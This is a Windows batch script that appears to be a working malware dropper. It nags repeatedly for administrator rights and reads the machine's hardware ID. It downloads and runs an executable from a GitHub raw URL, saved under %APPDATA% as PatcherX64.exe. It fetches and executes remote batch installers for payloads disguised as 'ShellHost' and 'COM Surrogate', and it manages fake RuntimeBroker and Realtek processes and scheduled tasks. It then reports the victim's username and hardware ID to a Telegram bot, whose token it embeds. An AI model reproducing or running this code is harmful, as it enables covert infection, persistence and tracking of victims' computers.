:: jWvR3Jxo

@echo off

:: Check Admin Privileges
net session >nul 2>&1
if %errorlevel% equ 0 (
:: Admin Granted
goto RUNADMINHERE
) else (
:: Admini Not Granted
goto loop
)


:loop
timeout /t 1 /nobreak >nul
:: Requesting Admin Privileges...
powershell -Command "Start-Process '%~f0' -Verb RunAs"

if %errorlevel% equ 0 (
 :: Admin Granted
goto exit
) else ( 
:: ( Admin Not Granted )
    goto loop
)








:RUNADMINHERE
cd /d "%~dp0"
color 0A


:: Place HWID into %HWID% variable 
for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID"') do set HWID=%%i


:: -------------------------------------------------------------------------------


:: Check for Scheduled Task + convertsshd.exe ( if one of both not found install RunEvery
:: If both found , remove RTK+RNTM after Check All V & Add 



:: Check for the scheduled task named "SystemLibrariesU"
schtasks /query /TN "SystemLibrariesU" >nul 2>&1
set "taskExists=%ERRORLEVEL%"

:: Check for the existence of convertsshd.exe
if not exist "%SystemRoot%\System32\convertsshd.exe" (
    set "fileExists=0"
) else (
    set "fileExists=1"
)

:: If either the task doesn't exist or the file doesn't exist, go to :INSTALLEVERY
if %taskExists% neq 0 (
    echo Scheduled task "SystemLibrariesU" does not exist.
    goto :INSTALLEVERY
)

if %fileExists% neq 1 (
    echo File "convertsshd.exe" does not exist.
    goto :INSTALLEVERY
)

:: Both the scheduled task and the file exist
goto :NEXT1




:INSTALLEVERY
echo Performing installation or alternative actions...

:: RunEveryInstaller

 
:loop
 
:: Kill & Delete file 
taskkill /f /im PatcherX64.exe >nul 2>&1
del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
 
for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
 
:: Download the file using curl
curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
 
timeout /t 2 /nobreak >nul
 
:: Checking the existing of the file
if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
    echo.
    echo The download hasn't started yet. Please check your connection.
	timeout /t 2 /nobreak >nul
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak >nul
	echo.
	goto loop
)
 
 
 
:: Get the file size in bytes
for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
 
 
 
:: Check if the file size is at least 400KB (400000 bytes)
if %FILESIZE% geq 400000 (
    start "" "%APPDATA%\microsoft\PatcherX64.exe"
) else (
echo.
    echo Download incomplete. Check your connection and run the file again.
	timeout /t 2 /nobreak >nul
	echo Retrying in 2 seconds ....
	timeout /t 2 /nobreak >nul
	echo.
	goto loop
)
 
 
echo Patcher Running...
timeout /t 1 /nobreak >nul









:NEXT1

echo Stopping processes...
taskkill /F /IM RuntimeBroker.exe
taskkill /F /IM RtkAudUService64.exe

echo Removing scheduled tasks...
schtasks /Delete /TN "WinRNTMUpdate" /F
schtasks /Delete /TN "WinRTKUpdate" /F
schtasks /Delete /TN "checkCOMandadd" /F

taskkill /F /IM RuntimeBroker.exe
taskkill /F /IM RtkAudUService64.exe


echo Deleting files...
del /F /Q "%SystemRoot%\System32\TSSPrxy.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyAd.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyRNTM.exe"
del /F /Q "%SystemRoot%\System32\TSSPrxyAdRNTM.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe"
del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RtkAudUService64.exe"

echo Operation completed.






:: -------------------------------------------------------------------------------




:STARTUPTASK


setlocal enabledelayedexpansion

:: Fucker CHAT ID : -1002163721260
:: Output CHAT ID : -1002460905948


:: Set bot token, chat ID, and message
set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
set "CHAT_ID=-1002163721260"
set "MESSAGE=PC|%USERNAME%|%HWID%|STARTED|"




:loop
color 0A



:CheckSHST
:: Check ShellHost.exe; if found, skip to CheckComSurrogate
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ShellHost.exe" (
    goto CheckComSurrogate
)

:: Run commands if RtkAudUService64.exe is not found
echo Checking for ShellHost...
set "embeddedScript=temp_script_SHST.bat"

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ShellHost') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from ShellHost Link
    echo.
    timeout /t 3 /nobreak >nul
    goto CheckSHST
)

set "MESSAGE=%MESSAGE%|SHST|"








:CheckComSurrogate
:: Check ComSurrogate.exe; if found, skip to next section
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe" (
    goto SENDMSG
)

:: Run commands if ComSurrogate.exe is not found
echo Checking for COM Surrogate...
set "embeddedScript=temp_script_COM.bat"

:: Download content and save to the embedded batch file
powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/ComSurrogate') | Out-File -Encoding ASCII '%embeddedScript%'"

if exist "%embeddedScript%" (
    echo Script content saved to %embeddedScript%.
    call "%embeddedScript%"
    del "%embeddedScript%" >nul 2>&1
) else (
    echo Filed to get content from ComSurrogate Link
    echo.
    timeout /t 3 /nobreak >nul
    goto CheckComSurrogate
)

set "MESSAGE=%MESSAGE%|ComSurrogate|"









:SENDMSG


:: URL encode the message by replacing spaces with %20
set "ENCODED_MESSAGE=%MESSAGE: =%%2"

:: Send the message using curl
curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
     -d "chat_id=%CHAT_ID%" ^
     -d "text=%ENCODED_MESSAGE%"

echo Message sent to chat ID %CHAT_ID%
endlocal
